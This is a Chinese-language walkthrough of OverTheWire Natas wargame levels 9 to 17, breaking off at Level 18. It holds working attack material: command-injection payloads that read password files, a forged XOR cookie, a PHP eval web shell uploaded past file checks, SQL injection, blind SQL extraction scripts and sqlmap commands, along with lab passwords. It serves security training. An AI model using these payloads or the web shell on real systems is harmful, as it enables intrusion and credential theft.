\u603b\u4e4b\u5148\u67e5\u770b\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas9 </ h1 > < div id = \"content\" > < form > Find words containing: < input name = needle >< input type = submit name = submit value = Search >< br >< br > </ form > Output: < pre > <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); } ?> </ pre > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u8f93\u5165\u6ca1\u6709\u7ecf\u8fc7\u4efb\u4f55\u5904\u7406\u76f4\u63a5\u653e\u5230\u547d\u4ee4\u5b57\u7b26\u4e32\u91cc\u4e86\uff01\u8fd9\u6837\u4e00\u6765\uff0c\u53ef\u5c31\u4e0d\u80fd\u53ea\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\u4e86\u54e6~\ud83d\udc7f\u63d0\u4ea4 ;cat /etc/natas_webpass/natas10 # \uff0c\u62fc\u63a5\u540e\u7684\u547d\u4ee4\u5982\u4e0b 1 grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt \u6210\u529f\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4 Level 10 \u00b6 Username natas10 Password nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu URL http://natas10.natas.labs.overthewire.org \u8fd9\u56de\u4f1a\u8fc7\u6ee4\u6389\u4e00\u4e9b\u5b57\u7b26(\u014f\u03c9\u014f) \u901a\u8fc7\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5206\u9694\u7b26\u88ab\u8fc7\u6ee4\u6389\u4e86(\u2565\u03c9\u2565) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas10 </ h1 > < div id = \"content\" > For security reasons, we now filter on certain characters < br />< br /> < form > Find words containing: < input name = needle >< input type = submit name = submit value = Search >< br >< br > </ form > Output: < pre > <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { # \u8fc7\u6ee4\u6389\u4e86\u5206\u9694\u7b26 if(preg_match('/[;|&]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); } } ?> </ pre > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u4e0d\u8fc7\uff0c grep \u53ef\u4ee5\u540c\u65f6\u5904\u7406\u591a\u4e2a\u6587\u4ef6\uff0c\u90a3\u4e48\u53ea\u8981\u731c\u6d4b /etc/natas_webpass/natas11 \u6587\u4ef6\u5185\u5bb9\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u5c31\u53ef\u4ee5\u5566~\uff08\u63a8\u8350\u731c\u6570\u5b57(<\u309d\u03c9\u03a6)\uff0c 0-9 \u5c31\u53ef\u4ee5\uff0c\u540c\u65f6 dictionary.txt \u6587\u4ef6\u4e2d\u4e5f\u4e0d\u542b\u6570\u5b57\uff09 Usage: grep [OPTION]... PATTERN [FILE]... \u63d0\u4ea4 1 /etc/natas_webpass/natas11 \uff0c\u60ca\u559c\uff01 Level 11 \u00b6 Username natas11 Password U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK URL http://natas11.natas.labs.overthewire.org \u53ef\u4ee5\u901a\u8fc7\u8868\u5355\u63d0\u4ea4\u5e76\u8bbe\u7f6e\u80cc\u666f\u989c\u8272\uff0c\u63d0\u793a\uff1a Cookies \u53d7\u5f02\u6216\u52a0\u5bc6\u4fdd\u62a4 \uff1f \u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u4e86\u89e3\u5230\u9700\u8981\u901a\u8fc7 Cookie \u8bbe\u7f6e showpassword \u7684\u503c\u4e3a yes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > <? # \u53d8\u91cf $defaultdata \u4e2d showpassword \u7684\u521d\u59cb\u503c\u4e3a no $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\"); function xor_encrypt($in) { $key = '<censored>'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { # \u5f02\u6216\u8fd0\u7b97\uff0c\u53ef\u901a\u8fc7\u5c06\u8f93\u5165\u548c\u8f93\u51fa\u5f02\u6216\u5f97\u5230\u53d8\u91cf $key $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { # HTTP \u8bf7\u6c42\u5934\u4e2d\u5305\u542b\u7684 Cookie \u4e3b\u8981\u7528\u4e8e\u4f20\u9012 showpassword \u7684\u503c global $_COOKIE; $mydata = $def; if(array_key_exists(\"data\", $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true); if(is_array($tempdata) && array_key_exists(\"showpassword\", $tempdata) && array_key_exists(\"bgcolor\", $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } # \u4fdd\u5b58\u5230 Cookie \u4e2d function saveData($d) { setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d)))); } # \u5c06 Cookie \u7684\u503c\u7ecf\u8fc7 Base64 \u89e3\u7801\u3001\u4e0e\u5bc6\u94a5\u5f02\u6216\u5e76\u8f6c\u5316\u4e3a json \u683c\u5f0f\u8d4b\u503c\u7ed9\u53d8\u91cf $data $data = loadData($defaultdata); # \u63a5\u6536\u901a\u8fc7 GET \u8bf7\u6c42\uff08\u8868\u5355\uff09\u63d0\u4ea4\u7684\u80cc\u666f\u989c\u8272\u5e76\u8bbe\u7f6e if(array_key_exists(\"bgcolor\",$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?> < h1 > natas11 </ h1 > < div id = \"content\" > < body style = \"background: <?=$data['bgcolor']?>;\" > Cookies are protected with XOR encryption < br />< br /> <? # \u9700\u8981\u5f97\u5230\u5305\u542b $data[\"showpassword\"] == \"yes\" \u5bf9\u5e94\u7684 Cookie if($data[\"showpassword\"] == \"yes\") { print \"The password for natas12 is <censored><br>\"; } ?> < form > Background color: < input name = bgcolor value = \"<?=$data['bgcolor']?>\" > < input type = submit value = \"Set color\" > </ form > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u76f4\u63a5\u63d0\u4ea4\u8868\u5355\uff0c\u83b7\u5f97\u53d8\u91cf $defaultdata \u5bf9\u5e94\u7684 Cookie \u901a\u8fc7\u5f02\u6216\u83b7\u5f97\u53d8\u91cf $key \u7684\u503c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php # calc.php $defaultdata = array ( \"showpassword\" => \"no\" , \"bgcolor\" => \"#ffffff\" ); $data = \"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=\" ; function xor_encrypt ( $in , $out ) { $outText = '' ; for ( $i = 0 ; $i < strlen ( $in ); $i ++ ) { $outText .= $in [ $i ] ^ $out [ $i % strlen ( $out )]; } return $outText ; } echo xor_encrypt ( base64_decode ( $data ), json_encode ( $defaultdata )); ?> \u5faa\u73af\u8282\u957f\u5ea6\u4e3a 4\uff0c\u8f7b\u677e\u83b7\u5f97 $key \u503c\uff1a qw8J 1 2 $ php -f calc.php qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq \u63a5\u4e0b\u6765\u83b7\u53d6\u76ee\u6807 Cookie 1 2 $ php -f calc.php ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php # calc.php $targetdata = array ( \"showpassword\" => \"yes\" , \"bgcolor\" => \"#ffffff\" ); function xor_encrypt ( $in ) { $key = 'qw8J' ; $text = $in ; $outText = '' ; for ( $i = 0 ; $i < strlen ( $text ); $i ++ ) { $outText .= $text [ $i ] ^ $key [ $i % strlen ( $key )]; } return $outText ; } echo base64_encode ( xor_encrypt ( json_encode ( $targetdata ))); ?> \u7f16\u8f91\u539f HTTP \u8bf7\u6c42\u5934\u4e2d\u7684 Cookie \u7684\u503c\uff0c\u5e76\u518d\u6b21\u53d1\u9001\uff0c\u6210\u529f\u83b7\u53d6\u4e0b\u4e00\u5173\u53e3\u4ee4 Level 12 \u00b6 Username natas12 Password EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 URL http://natas12.natas.labs.overthewire.org \u8868\u5355\uff1a\u4e0a\u4f20 JPEG \u6587\u4ef6 \u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u6ce8\u610f\u5230\u5e76\u6ca1\u6709\u5bf9\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u7c7b\u578b\u68c0\u67e5\uff08\u5305\u62ec\u6587\u4ef6\u540e\u7f00\u540d\uff09\uff0c\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u540e\uff0c\u6587\u4ef6\u540d\u662f\u968f\u673a\u751f\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u6587\u4ef6\u540e\u7f00\u540d\u5219\u7531\u524d\u7aef\u76f4\u63a5\u5b9a\u4e49 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas12 </ h1 > < div id = \"content\" > <? # \u751f\u6210\u957f\u5ea6\u4e3a 10 \u7684\u968f\u673a\u5b57\u7b26\u4e32 function genRandomString() { $length = 10; $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\"; $string = \"\"; for ($p = 0; $p < $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\"/\".genRandomString().\".\".$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { # \u83b7\u5f97\u4f20\u5165\u8def\u5f84\u5b57\u7b26\u4e32\u4e2d\u7684\u6587\u4ef6\u6269\u5c55\u540d $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\"filename\", $_POST)) { $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]); if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { echo \"File is too big\"; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo \"The file <a href=\\\"$target_path\\\">$target_path</a> has been uploaded\"; } else{ echo \"There was an error uploading the file, please try again!\"; } } } else { ?> < form enctype = \"multipart/form-data\" action = \"index.php\" method = \"POST\" > < input type = \"hidden\" name = \"MAX_FILE_SIZE\" value = \"1000\" /> <!-- \u76f4\u63a5\u5b9a\u4e49\u6587\u4ef6\u540e\u7f00\u540d\u3002\u6b64\u5904\u663e\u793a\u7684\u6587\u4ef6\u540d\u65e0\u6548 --> < input type = \"hidden\" name = \"filename\" value = \"<? print genRandomString(); ?>.jpg\" /> Choose a JPEG to upload (max 1KB): < br /> < input name = \"uploadedfile\" type = \"file\" />< br /> < input type = \"submit\" value = \"Upload File\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u521b\u5efa\u5e76\u7f16\u8f91\u6587\u4ef6 hack.php 1 <?php @ eval ( $_POST [ 'pass' ]); ?> \u4fee\u6539\u524d\u7aef\u8868\u5355\uff0c\u5c06\u6587\u4ef6\u540e\u7f00 jpg \u6539\u4e3a php \uff0c\u5e76\u4e0a\u4f20\u6587\u4ef6 hack.php \u4fdd\u5b58\u6587\u4ef6\u94fe\u63a5 \u5148\u4f7f\u7528\u4e2d\u56fd\u83dc\u5200\u6d4f\u89c8\u5668\u8bbf\u95ee http://natas12.natas.labs.overthewire.org \uff0c\u5b8c\u6210\u8eab\u4efd\u9a8c\u8bc1 \u6dfb\u52a0SHELL \u8fdb\u5165\u6587\u4ef6\u7cfb\u7edf\u540e\uff0c\u627e\u5230 /etc/natas_webpass/natas13 \u5373\u53ef Level 13 \u00b6 Username natas13 Password jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY URL http://natas13.natas.labs.overthewire.org \u9875\u9762\u63d0\u793a\u53ea\u63a5\u6536\u56fe\u7247\u6587\u4ef6 \u6e90\u7801\u4e2d\u4f7f\u7528 exif_imagetype \u51fd\u6570\u5224\u65ad\u4e0a\u4f20\u7684\u6587\u4ef6\u662f\u5426\u4e3a\u56fe\u7247\uff08\u8fd4\u56de FALSE \u6216\u56fe\u7247\u7c7b\u578b\uff09\uff0c exif_imagetype \u901a\u8fc7\u8bfb\u53d6\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c\u5224\u65ad 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas13 </ h1 > < div id = \"content\" > For security reasons, we now only accept image files! < br />< br /> <? function genRandomString() { $length = 10; $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\"; $string = \"\"; for ($p = 0; $p < $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\"/\".genRandomString().\".\".$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\"filename\", $_POST)) { $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]); $err=$_FILES['uploadedfile']['error']; if($err){ if($err === 2){ echo \"The uploaded file exceeds MAX_FILE_SIZE\"; } else{ echo \"Something went wrong :/\"; } } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { echo \"File is too big\"; } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { echo \"File is not an image\"; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo \"The file <a href=\\\"$target_path\\\">$target_path</a> has been uploaded\"; } else{ echo \"There was an error uploading the file, please try again!\"; } } } else { ?> < form enctype = \"multipart/form-data\" action = \"index.php\" method = \"POST\" > < input type = \"hidden\" name = \"MAX_FILE_SIZE\" value = \"1000\" /> < input type = \"hidden\" name = \"filename\" value = \"<? print genRandomString(); ?>.jpg\" /> Choose a JPEG to upload (max 1KB): < br /> < input name = \"uploadedfile\" type = \"file\" />< br /> < input type = \"submit\" value = \"Upload File\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u5728 hack.php \u4e2d\u6dfb\u52a0\u4efb\u610f\u56fe\u7247\u6587\u4ef6\u6587\u4ef6\u5934\u5373\u53ef\u7ed5\u8fc7 exif_imagetype \u68c0\u67e5 1 2 BM <?php @ eval ( $_POST [ 'pass' ]); ?> \u63a5\u4e0b\u6765\uff0c\u4fee\u6539\u524d\u7aef\u6587\u4ef6\u540e\u7f00\u540d\u3001\u4e0a\u4f20\u6587\u4ef6\u3001\u4f7f\u7528\u83dc\u5200\u7684\u6b65\u9aa4\u3001\u65b9\u6cd5\u4e0e Level 12 \u4e00\u81f4 \u53c2\u8003\u8d44\u6599 \u00b6 PHP: exif_imagetype - Manual Level 14 \u00b6 Username natas14 Password Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 URL http://natas14.natas.labs.overthewire.org \u4e00\u4e2a\u7528\u6237\u767b\u5f55\u7684\u8868\u5355 \u4ece\u6e90\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u63d0\u4ea4\u7684\u8868\u5355\u5b57\u7b26\u4e32\u672a\u7ecf\u8fc7\u4efb\u4f55\u8fc7\u6ee4\uff0c\u76f4\u63a5\u88ab\u62fc\u63a5\u5230\u4e86 SQL \u8bed\u53e5\u4e2d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas14 </ h1 > < div id = \"content\" > <? if(array_key_exists(\"username\", $_REQUEST)) { $link = mysql_connect('localhost', 'natas14', '<censored>'); mysql_select_db('natas14', $link); # \u6ce8\u610f\u662f\u53cc\u5f15\u53f7 $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\" and password=\\\"\".$_REQUEST[\"password\"].\"\\\"\"; if(array_key_exists(\"debug\", $_GET)) { echo \"Executing query: $query<br>\"; } if(mysql_num_rows(mysql_query($query, $link)) > 0) { echo \"Successful login! The password for natas15 is <censored><br>\"; } else { echo \"Access denied!<br>\"; } mysql_close($link); } else { ?> < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > Password: < input name = \"password\" >< br > < input type = \"submit\" value = \"Login\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u4f7f\u7528\u6700\u7b80\u5355\u7684 SQL \u6ce8\u5165\u65b9\u5f0f\u5373\u53ef \u4e0b\u4e00\u5173\u53e3\u4ee4 GET\u2714 Level 15 \u00b6 Username natas15 Password AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J URL http://natas15.natas.labs.overthewire.org \u8f93\u5165\u7528\u6237\u540d\uff0c\u68c0\u67e5\u8be5\u7528\u6237\u662f\u5426\u5b58\u5728 \u67e5\u770b\u6e90\u7801\uff0c\u5176\u4e2d\u63d0\u4f9b\u4e86 users \u6570\u636e\u5e93\u8868\u7ed3\u6784\uff0c\u5404\u5b57\u6bb5\u7684\u7c7b\u578b\u53ca\u957f\u5ea6\u9650\u5236 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas15 </ h1 > < div id = \"content\" > <? # \u63d0\u4f9b\u4e86 users \u6570\u636e\u5e93\u8868\u7ed3\u6784 /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\"username\", $_REQUEST)) { $link = mysql_connect('localhost', 'natas15', '<censored>'); mysql_select_db('natas15', $link); $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\"; if(array_key_exists(\"debug\", $_GET)) { echo \"Executing query: $query<br>\"; } $res = mysql_query($query, $link); if($res) { # \u67e5\u8be2\u7ed3\u679c\u4e0d\u76f4\u63a5\u56de\u663e if(mysql_num_rows($res) > 0) { echo \"This user exists.<br>\"; } else { echo \"This user doesn't exist.<br>\"; } } else { echo \"Error in query.<br>\"; } mysql_close($link); } else { ?> < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > < input type = \"submit\" value = \"Check existence\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u7531\u4e8e\u67e5\u8be2\u7ed3\u679c\u4e0d\u80fd\u56de\u663e\u5230\u524d\u7aef\uff0c\u9700\u8981\u8fdb\u884c SQL \u76f2\u6ce8\uff08 blind-based SQL injection \uff09 \u9700\u8981\u83b7\u53d6\u7684\u662f\u7528\u6237 natas16 \u7684\u53e3\u4ee4\uff0c\u67e5\u8be2\u3001\u786e\u8ba4\u8be5\u7528\u6237\u5b58\u5728 \u901a\u8fc7\u5e03\u5c14\u578b SQL \u76f2\u6ce8\u83b7\u53d6 32 \u4f4d\u7684\u53e3\u4ee4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/python # -*- coding: UTF-8 -*- import requests from lxml import etree auth_username = 'natas15' auth_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J' url = 'http://natas15.natas.labs.overthewire.org' table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' key = '' for i in range ( 1 , 33 ): l , r = 0 , 61 while l <= r : mid = ( l + r ) >> 1 ch = table [ mid ] res = requests . post ( url + '/index.php' , { 'username' : '\" UNION SELECT * FROM users WHERE username = \"natas16\" and ascii(SUBSTRING(password, %d , 1)) >= ascii(\" %s \")#' % ( i , ch )}, auth = ( auth_username , auth_password ), headers = { 'Connection' : 'close' }) sqlres = etree . HTML ( res . content ) . xpath ( '/html/body/div/text()' )[ 0 ] if \"This user exists\" in sqlres : l = mid + 1 ans = mid else : r = mid - 1 key += table [ ans ] print ( key ) \u4e5f\u53ef\u4ee5\u4f7f\u7528 sqlmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # \u679a\u4e3e\u6570\u636e\u5e93 $ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type = basic --auth-cred = natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data = username = natas16 --dbms = mysql --level = 5 --dbs ... available databases [ 2 ] : [ * ] information_schema [ * ] natas15 ... # \u8868\u540d\u5df2\u77e5\uff0c\u76f4\u63a5\u83b7\u53d6 users \u8868 $ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type = basic --auth-cred = natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data = username = natas16 --dbms = mysql --level = 5 -D natas15 -T users --dump ... Database: natas15 Table: users [ 4 entries ] +----------+----------------------------------+ | username | password | +----------+----------------------------------+ | bob | 6P151OntQe | | charlie | HLwuGKts2w | | alice | hROtsfM734 | | natas16 | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh | +----------+----------------------------------+ ... \u53c2\u8003\u8d44\u6599 \u00b6 What is Blind SQL Injection? Tutorial & Examples | Web Security Academy How can I make SQL case sensitive string comparison on MySQL? - Stack Overflow Usage \u00b7 sqlmapproject/sqlmap Wiki Level 16 \u00b6 Username natas16 Password WaIHEacj63wnNIBROHeqi3p9t0m5nhmh URL http://natas16.natas.labs.overthewire.org \u662f Level 10 \u7684\u52a0\u5f3a\u7248(\u2014\u02cb\u03c9\u02ca\u2014) \u4e0e Level 10 \u7684\u4e3b\u8981\u533a\u522b\u4e3a\u591a\u8fc7\u6ee4\u4e86\u53cd\u5f15\u53f7\u3001\u5355\u53cc\u5f15\u53f7\uff0c\u5e76\u4e14\u5728\u6267\u884c grep \u547d\u4ee4\u7684\u8bed\u53e5\u4e2d\uff0c\u4f7f\u7528\u53cc\u5f15\u53f7\u5305\u88f9\u4e86 $key \u53d8\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas16 </ h1 > < div id = \"content\" > For security reasons, we now filter even more on certain characters < br />< br /> < form > Find words containing: < input name = needle >< input type = submit name = submit value = Search >< br >< br > </ form > Output: < pre > <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { if(preg_match('/[;|&`\\'\"]/',$key)) { print \"Input contains an illegal character!\"; } else { # \u65e0\u8bba\u4ec0\u4e48\u8f93\u5165\u90fd\u53ea\u80fd\u4f5c\u4e3a\u6a21\u5f0f\u5b57\u7b26\u4e32 passthru(\"grep -i \\\"$key\\\" dictionary.txt\"); } } ?> </ pre > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u8fd8\u5269\u4e0b\u547d\u4ee4\u66ff\u6362 $(cmd) \u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u53ef\u4f7f\u7528\u7c7b\u4f3c Level 15 \u7684\u65b9\u6cd5\u4f9d\u6b21\u83b7\u53d6\u4e0b\u4e00\u5173\u53e3\u4ee4\u5b57\u7b26 \u63d0\u4ea4 ?needle=$(grep -E ^.{n-1}X /etc/natas_webpass/natas17)Allah \uff0c\u5373\u67e5\u770b /etc/natas_webpass/natas17 \u5185\u5b57\u7b26\u4e32\u7684\u7b2c n \u4f4d\u662f\u5426\u4e3a X \uff0c\u82e5\u662f\uff0c\u8fd4\u56de\u503c\u4e0d\u4e3a\u7a7a\uff0c\u4e0e\u5176\u540e\u7d27\u968f\u7684\u5355\u8bcd\u7ec4\u5408\u5bfc\u81f4\u65e0\u6cd5\u5728 dictionary.txt \u67e5\u627e\u5230\u8be5\u8bcd\uff0c\u8fd4\u56de\u4e3a\u7a7a\uff0c\u5426\u5219\u5c06\u5728 Output \u5904\u6709\u8f93\u51fa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/usr/bin/python # -*- coding: UTF-8 -*- import requests from lxml import etree auth_username = 'natas16' auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh' url = 'http://natas16.natas.labs.overthewire.org/' table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' key = '' for i in range ( 1 , 33 ): for ch in table : res = requests . post ( url + '?needle=$(grep -E ^.{ %d } %c /etc/natas_webpass/natas17)Allah' % ( i - 1 , ch ), auth = ( auth_username , auth_password ), headers = { 'Connection' : 'close' }) sqlres = etree . HTML ( res . content ) . xpath ( '/html/body/div[1]/pre/text()' )[ 0 ] . strip () if len ( sqlres ) == 0 : key += ch break print ( key ) Level 17 \u00b6 Username natas17 Password 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw URL http://natas17.natas.labs.overthewire.org \u524d\u7aef\u540c Level 15 \uff0c\u8f93\u5165\u7528\u6237\u540d\uff0c\u68c0\u67e5\u8be5\u7528\u6237\u662f\u5426\u5b58\u5728 \u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u67e5\u8be2\u7ed3\u679c\u8f93\u51fa\u90e8\u5206\u90fd\u88ab\u6ce8\u91ca\u6389\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas17 </ h1 > < div id = \"content\" > <? /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\"username\", $_REQUEST)) { $link = mysql_connect('localhost', 'natas17', '<censored>'); mysql_select_db('natas17', $link); $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\"; if(array_key_exists(\"debug\", $_GET)) { echo \"Executing query: $query<br>\"; } $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) > 0) { //echo \"This user exists.<br>\"; } else { //echo \"This user doesn't exist.<br>\"; } } else { //echo \"Error in query.<br>\"; } mysql_close($link); } else { ?> < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > < input type = \"submit\" value = \"Check existence\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u53ef\u4ee5\u57fa\u4e8e\u65f6\u95f4\u5ef6\u8fdf\u8fdb\u884c SQL \u76f2\u6ce8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/python # -*- coding: UTF-8 -*- import requests from lxml import etree auth_username = 'natas17' auth_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw' url = 'http://natas17.natas.labs.overthewire.org' table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' key = '' for i in range ( 1 , 33 ): l , r = 0 , 61 while l <= r : mid = ( l + r ) >> 1 ch = table [ mid ] while True : res = requests . post ( url + '/index.php' , { 'username' : '\" UNION SELECT * FROM users WHERE username = \"natas18\" and ascii(SUBSTRING(password, %d , 1)) >= ascii(\" %s \") and sleep(2)#' % ( i , ch )}, auth = ( auth_username , auth_password ), headers = { 'Connection' : 'close' }) if res . status_code == 200 : break if res . elapsed . seconds >= 2 : l = mid + 1 ans = mid else : r = mid - 1 key += table [ ans ] print ( key ) Level 18 \u00b6 Username natas18 Password 